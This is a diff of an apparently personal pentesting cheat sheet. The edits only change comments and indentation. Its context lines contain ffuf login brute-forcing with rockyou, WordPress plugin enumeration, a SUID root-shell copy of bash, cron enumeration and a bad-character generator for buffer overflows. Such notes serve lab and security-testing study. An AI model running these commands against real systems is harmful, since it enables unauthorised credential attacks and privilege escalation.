@@ -32,7 +32,7 @@
 	# HTTP post form
 	ffuf -X POST -u http://$IP/login.php -d "username=USER&password=PASS&login=" -H "Content-Type: application/x-www-form-urlencoded" -w users:USER -w /usr/share/wordlists/rockyou.txt:PASS -x http://127.0.0.1:8080 -fr 'Wrong username' -ac
 
-	# WordPress (wpscan sucks!)
+	# WordPress plugins ( I failed to use wpscan )
 	ffuf -u http://$IP/wp-content/plugins/FUZZ -w /usr/share/wordlists/wordpress-plugins.txt -c
 	
 	# SMB brute force ( hydra did not work )
@@ -49,8 +49,8 @@
 	cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash;/tmp/rootbash -p
 
 	# Look carefully to find a cronjob running in a small timeframe and check PATH
-		cat /etc/crontab
-		ls -alhR /etc/cron*
+	cat /etc/crontab
+	ls -alhR /etc/cron*
 
 # Buffer Overflow
 	$ for i in {1..255}; do printf "\\\x%02x" $i; done;
